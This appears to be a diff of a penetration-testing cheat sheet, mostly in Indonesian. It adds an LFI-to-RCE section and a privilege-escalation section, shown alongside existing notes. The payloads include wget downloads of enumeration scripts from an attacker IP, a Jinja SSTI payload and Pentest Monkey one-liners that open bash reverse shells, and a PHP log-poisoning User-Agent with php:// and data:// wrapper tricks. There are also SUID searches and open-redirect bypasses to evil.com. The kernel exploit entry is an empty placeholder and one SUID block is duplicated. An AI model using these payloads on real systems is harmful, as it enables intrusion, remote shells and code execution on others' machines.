@@ -12,6 +12,7 @@
 
 </div>
 
+<br> <br>
 
 Ingat perintah berikut:
 ```bash
@@ -24,6 +25,7 @@ cd /tmp
 wget http://69.69.69.69:899/linpeas.sh
 wget http://69.69.69.69:899/linux-exploit-suggester.sh
 ``` 
+<br> <br>
 
 SQLi to RCE
 ```python
@@ -81,6 +83,7 @@ sqlmap.py -u "http://192.168.1.69:6969/logs/search?q='" --file-write="C:\Users\M
 
 Syarat: FILE privilege & path webroot absolut diketahui (mis. /var/www/html).
 ```
+<br> <br>
 
 SSTI to RCE
 ```bash
@@ -109,6 +112,7 @@ ${ 7 * 7 }
 {{lipsum.__globals__.os.popen("bash -c 'bash -i >& /dev/tcp/10.10.12.12/43795 0>&1'").read()}}
 
 ```
+<br> <br>
 
 Reverse Shell dari Pentest Monkey (especially after Command Injecting `ping google.com;id`) 
 ```bash
@@ -122,8 +126,45 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 # Bash | this was tested on Ubuntu 10.10
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 ```
+<br> <br>
 
+LFI to RCE
+```python
+....//
+..././
+..//
+%252e%252e%252f
+....//....//etc/passwd
+%2e%2e%2f → ../
+Null byte %00 → /etc/passwd%00.php
 
+# Di dalam request
+User-Agent: <?php system($_GET[c]);?>
+
+GET /?page= ../../../var/log/apache2/access.log
+GET /?page= ../../../var/log/apache2/access.log?c=id
+GET /?page=data://text/plain,<?php+system('id');+?>
+POST /?page=php://input
+```
+<br> <br>
+
+# Privilege Escalation
+
+## Kernel Exploit (Kernel LPE)
+Kernel merupakan bagian inti pada sebuah OS. Berfungsi untuk mengatur/menghubungkan Software dengan Hardware. Kernel memiliki akses penuh pada OS. Eksploitasi Kernel dapat memberikan kita root shell.
+```bash
+???
+```
+
+## SUID
+```bash
+find / -perm -u=s -type f 2>/dev/null
+```
+
+## SUID
+```bash
+find / -perm -u=s -type f 2>/dev/null
+```
 
 
 Open Redirect (examples)
@@ -133,7 +174,7 @@ example.com/redirect?url=http://evil.com (Not Allowed)
 example.com/redirect?url=http://evilgoogle.com (Allowed - Bypass!)
 example.com/redirect?url=http://evil.com/?http://google.com (Allowed - Bypass!)
 ``` 
-
+<br> <br>
 
 * LinPEAS = https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
 * LES = https://github.com/The-Z-Labs/linux-exploit-suggester
